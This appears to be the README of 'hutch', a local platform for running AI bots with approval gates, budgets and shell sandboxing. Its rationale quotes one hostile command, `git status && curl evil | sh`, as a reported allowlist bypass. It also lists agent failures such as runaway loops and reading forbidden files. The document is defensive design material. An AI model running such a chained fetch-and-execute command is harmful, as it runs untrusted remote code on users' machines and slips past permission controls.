# hutch

> Your bots. Your machine. Your rules.

hutch is a **local-first, MIT-licensed multi-bot platform in private preview** (early software, Linux first). Run named AI bots on
your own machine, each with its own model, tools, schedule, memory and workspace, with human approval gates,
step/time/token caps and run transcripts.

Hosted agent products (OpenAI dots, Grok Bot) give each agent a computer in the vendor's cloud. hutch runs on your
machine instead: the orchestrator, memory, logs and bots live in one directory on your disk, with models you choose, local
(Ollama, llama.cpp, LM Studio) or hosted (Anthropic, OpenAI, any OpenAI-compatible API). The trade-off is that
nothing runs while the machine is asleep.

**Status.** What works and what does not is tracked in [docs/realignment/baseline.md](docs/realignment/baseline.md) (measured
today) and [docs/realignment/ledger.md](docs/realignment/ledger.md) (what is being fixed). Not published: the repository is private
and there is no PyPI release, so install from a source checkout.

```
$ hutch run tidy-downloads "sort this week's downloads"
→ remember    {"key": "last-run", "value": "sort downloads"}
→ list_files  42 files
! approval needed: move invoices/ → sorted/invoices/      ← you decide
✓ approved — continuing
✓ moved 38 files · run succeeded (steps=6, tokens≈2.1k)
```

## Why it exists

Each core requirement traces to a *reported* failure class of agent products: runaway loops that keep spending, schedules that
quietly never ran, agents reading files they should not, allowlists bypassed with `git status && curl evil | sh`, permission
prompts so relentless people switch to yolo mode. Most of these are individual reports, not measured prevalence; the sources,
and which of them did not survive re-checking, are in [docs/research/complaints.md](docs/research/complaints.md). The design
answers, and their limits, are in [docs/safety.md](docs/safety.md).

## Quickstart

```bash
cd hutch                       # your source checkout (the repository is private)
pip install -e .               # from a source checkout; or: uv venv && uv pip install -e ".[dev]"
hutch init                   # state dir + 3 starter bots (free mock model — no API key)
hutch serve                  # dashboard → http://127.0.0.1:8787
```

Your first run will pause for a human decision — that's the point:

```bash
$ hutch run research-briefing "summarize this week's AI news"
! approval needed: write report.md (281 chars)
   resolve with: hutch approvals approve apr_…  (or --always to remember)
$ hutch approvals approve apr_… --always
✓ run succeeded (steps=4, tokens≈1.4k)
```

Then point a bot at a real model:

```bash
hutch bot update research-briefing --model ollama/llama3.2     # or openai/gpt-4o-mini
hutch daemon                 # headless: schedules, dispatch, approval expiry
```

## Feature highlights

- **Multiple named bots** — own model, tools, schedule, memory, workspace; pause/resume; templates
- **Model choice, local first** — native Ollama (context size always set), Anthropic, OpenAI, and OpenAI- or Anthropic-compatible endpoints; free offline mock runtime. Tested against recorded fakes; live provider and Ollama runs depend on your setup
- **Switch models from the chat** — a composer menu shows what fits this machine, what it costs and what is missing; per message, never a silent edit of the bot
- **Subscription plans as connections** — OpenCode Go, Xiaomi MiMo Token Plan or your own endpoint, each with its own key, allowance meter and terms notice
- **Local inference admission** — one caller and eight waiters across Hutch workers; releases capacity during human waits,
  rechecks native Ollama memory headroom, and shows queue reasons. Fit remains estimated; real models are unverified.
  `hutch doctor` reports configuration problems with suggested fixes.
- **Scheduling that survives sleep and DST** — IANA-timezone cron, DST-correct, catch-up after sleep; each occurrence and each run is
  claimed in the database; one elected supervisor handles schedules and recovery, and one bot never overlaps itself
- **Approvals that don't nag** — ask-once with sticky always-allows; unanswered = denied
- **Usage budgets** — steps and wall-clock limits plus atomic per-bot token and shared provider-account reservations. Currency checks use recorded prices and prompt estimates; unknown-price routes are refused while a currency cap is set, and provider billing can differ. `hutch usage reservations` lists uncertain charges for reconciliation. `serve`, `daemon`, and `hutch run` use one owned worker process per attempt; cancellation stays visible until cleanup is verified
- **Workspace and shell containment** — file tools stay in the workspace. New bots request Linux bubblewrap strict mode for shell commands, with no shell network and bounded resources; unsupported hosts fail closed. Existing bots keep their saved setting, and `sandbox: off` is explicitly uncontained execution. This shell boundary is not a VM and does not contain the browser or external runtimes
- **Run transcripts** — canonical SQLite events and recoverable JSONL files; durable delivery retries after restart and shows pending file errors without losing chat history
- **Uncertain action review** — inspect saved arguments in chat, check the destination and record a human outcome report. Missing receipts remain distinct from success; reconciliation preserves execution history and grants no permission.
- **Database restore review** — snapshot committed SQLite history, verify it in a new directory and quarantine old work. Source process records confer no cleanup authority; devices and standing grants are revoked, schedules paused and new execution held for a local review. Credentials, browser profiles and user files need separate backups. See [Operations](docs/operations.md).
- **Scoped reference facts** — bots propose facts in their chat; a human reviews them before recall. Sharing with other chats is explicit. Revised content needs a new review, old versions remain inspectable, and memory can be disabled without hiding management. Facts are reference data, never tool permission; archive keeps history and backups.
- **Reconnectable state** — ordered resource invalidations and snapshot reconciliation; chat approvals refresh without replacing the draft
- **Conversations (preview)** — the Studio stores separate threads across restarts, offers thread switching and archive, and sends a
  bounded recent history to the builtin runtime. The versioned API has SQLite full-text search, restart-safe command idempotency,
  cross-run transcript replay and bounded snapshot reconciliation after a cursor gap.
- **Remote pairing (experimental)** — explicit direct HTTPS binding and one-use, revocable device sessions are implemented. The phone
  control UI, browser/PTY handoff, trusted tunnel support and physical-device validation are still unavailable; loopback is the supported
  service boundary. See [remote operations](docs/operations.md#remote-pairing-experimental).
- **Browser (experimental)** — optional Playwright extra and a persistent profile per bot. A run can pause at some detected login
  walls; live handoff in the same session and a pinned browser egress path are unavailable.
- **External runtimes** — Pi and OpenCode are recognized in old bot configs but disabled before starting a process. Their
  permission broker, process containment and provider budget path are not ready. Supported execution choices are builtin and offline mock.

## Documentation

| Doc | Contents |
|---|---|
| [Architecture](docs/architecture.md) | component map, decision log, concurrency model |
| [Safety model](docs/safety.md) | deny/ask/allow rules, approval flow, honest limits |
| [Bot configuration](docs/bot-config.md) | fields, model specs, schedules, limits, examples |
| [Operations](docs/operations.md) | Linux sandbox requirements, remote pairing, incomplete cleanup, migration backups and restore |
| [Models](docs/models.md) | chat model switcher, fit, model slots, prices, `hutch doctor` |
| [Connections](docs/connections.md) | subscription plans and custom endpoints, keys, allowances, what is unsupported and why |
| [Design system](docs/design-system.md) | shared UI tokens, components, icon/emoji policy, a11y rules |
| [Roadmap](docs/roadmap.md) | phases: hardening → capability → scale-out |
| [Realignment](docs/realignment/baseline.md) | measured baseline, evidence ledger, [architecture decisions](docs/adr/), continuation ledger |
| [API and conversation contract](docs/realignment/contracts.md) | versioned local resources, idempotency, cursors and remaining remote-access gaps |
| [Research](docs/research/) | orchestrator/runtime comparison; incident-based requirements |

Marketing site: [website/](website/index.html) (static landing page; its claims are checked against the evidence ledger).
Web Dashboard: conversation-first Studio (`http://127.0.0.1:8787/#/chat`) with one bot roster, inline approvals and a cross-bot Needs you drawer. Bot settings own memory, permissions and defaults. Monitor holds Activity and run history; a searchable Fleet view appears at ten bots. See [navigation decisions](docs/realignment/navigation.md).

Configured fallback to another hosted account or destination requires a per-run review. A
broken stream retains uncertain usage and a retry needs another usage reservation. These
holds persist across allowance rollover until settled or explicitly reconciled. Stale workers
cannot release them or change their receiving account. These controls have fixture coverage;
provider billing and live compatibility remain unverified.

## Development

```bash
uv venv && uv pip install -e ".[dev]"
pytest --ignore=tests/e2e   # tests use recorded fakes/mock runtime; tests/e2e needs Playwright browsers
hutch demo seed && hutch serve   # rich dashboard state for manual testing
```

Python ≥ 3.11. Linux first; macOS/Windows are roadmap items.

## License

MIT — see [LICENSE](LICENSE).
